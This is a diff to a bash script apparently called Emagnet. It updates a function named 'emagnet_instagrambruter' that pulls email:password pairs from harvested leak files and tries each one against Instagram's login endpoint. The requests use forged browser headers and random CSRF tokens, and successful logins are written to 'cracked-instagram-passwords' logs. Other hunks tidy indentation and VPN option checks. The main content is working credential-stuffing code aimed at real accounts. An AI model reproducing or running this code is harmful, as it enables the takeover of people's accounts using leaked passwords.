@@ -350,7 +350,7 @@ else
                 printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
                 printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
                 sleep 5
-      fi
+            fi
                      if [[ "$MYIP" = "$MYOLDIP" ]]; then
                          echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
                          sleep 10
@@ -617,8 +617,9 @@ emagnet_instagrambruter() {
 URL="https://www.instagram.com/accounts/login/ajax/"
 ACCEPTLANG="Accept-Language: sv-SE,en;q=0.7,en-US;q=0.3"
 ACCEPT="Accept: */*'"
-XCSFRTOKEN="X-CSRFToken: dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps"
+XCSFRTOKEN="X-CSRFToken: $(openssl rand -hex 30 | cut -c 1-33)"
 AJAX="X-Instagram-AJAX: 4a1f95f94afb' -H 'X-IG-App-ID: 936619743392459"
+CSFRTOKEN="$(openssl rand -hex 30 | cut -c 1-33)"
 
     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
@@ -630,11 +631,21 @@ while read instagramlogin; do
 INSTAGRAM_USER="$(echo $instagramlogin|sed 's/:/\&password\=/g')"
 INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
 
- curl -s "${URL}" -H "${USERAGENT}" -H '$ACCEPT' -H "$ACCEPTLANG" --compressed -H "$XCSFRTOKEN" -H "$AJAX" -H 'X-IG-WWW-Claim: 0' -H \
-'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H \
-'Connection: keep-alive' -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H \
-'Cookie: rur=VLL; csrftoken=dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps; mid=XWyxNwAEAAHy5kJG_MPLMsE7Uzzs' -H 'DNT: 1' -H 'TE: Trailers' --data \
-"username=$USERNAME"|grep -q 'checkpoint\|authenticated": true'
+curl -s "$URL" -H 'sec-fetch-mode: cors' -H \
+'origin: https://www.instagram.com' -H \
+'x-ig-www-claim: 0' -H \
+'accept-language: en-US,en;q=0.9' -H \
+'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' -H \
+'x-requested-with: XMLHttpRequest' -H \
+"cookie: ig_cb=1; csrftoken=$CSFRTOKEN; rur=ATN; mid=XW7rUgAEAAFeErDMdCAja23Ty9KE" -H \
+"x-csrftoken: $CSFRTOKEN" -H \
+'x-ig-app-id: 936619743392459' -H 'accept-encoding: gzip, deflate, br' -H \
+'x-instagram-ajax: 6c66f7292327-hot' -H \
+'content-type: application/x-www-form-urlencoded' -H \
+'accept: */*' -H 'referer: https://www.instagram.com/' -H \
+'authority: www.instagram.com' -H \
+'sec-fetch-site: same-origin' --data \
+"username=${INSTAGRAM_USER}:${INSTAGRAM_PASS}"|grep -i 'checkpoint|/"status": "ok"'
 if [[ $? -eq "0" ]]; then
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
          echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
@@ -643,8 +654,8 @@ if [[ $? -eq "0" ]]; then
          echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
          echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETLOGS/cracked-instsagram-passwords.txt"
          echo -e "================================================================\n\n"         >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
-         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
-         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"        >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
+         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
          SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-cracked|grep 'Cracked Password'|wc -l)"
          FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-failed|grep 'Wrong Pasword'|wc -l)"
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $instagramlogin"
@@ -1180,11 +1191,12 @@ case "${1}" in
                          exit 1
                 fi
                 emagnet_conf
-                if [[ $VPNPROVIDER = "$VPNROOT/" && $VPNPROVIDER2 = "$VPNROOT/" && $VPNPROVIDER3 = "$VPNROOT/" ]]; then echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn";exit 1;fi
+                if [[ $VPNPROVIDER = "$VPNROOT/" && $VPNPROVIDER2 = "$VPNROOT/" && $VPNPROVIDER3 = "$VPNROOT/" ]]; then echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn\nusage: ./$basename$0 -v -p <provider>";exit 1;fi
                 if [[ -z "$2" ]]; then echo -e "$basename$0: internal error -- you must include true or false";exit 1;fi
                 if [[ "$2" = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then    sed -i '150d' "$CONF";sed -i "150i VPN=true" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been enabled";exit 1
                 elif [[ $2 = "false" ]] || [[ $2 = "off" ]] || [[ $2 = "disable" ]]; then sed -i '150d' "$CONF";sed -i "150i VPN=false" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been disabled";exit 1
-                else echo -e "emagnet: internal error -- $2 is an unknown option -- valid options is true or false"; exit 1; fi
+                elif [[ $1 = "-v"  || $2 = "-p" || -z $3 ]]; then echo -e "basename$0: internal error -- you must include a vpn provider"; exit 1
+                else echo -e "basename$0: internal error -- $2 is an unknown option -- valid options is true or false"; exit 1; fi
                 ;;
 
         "-b"|"-backup"|"--backup")
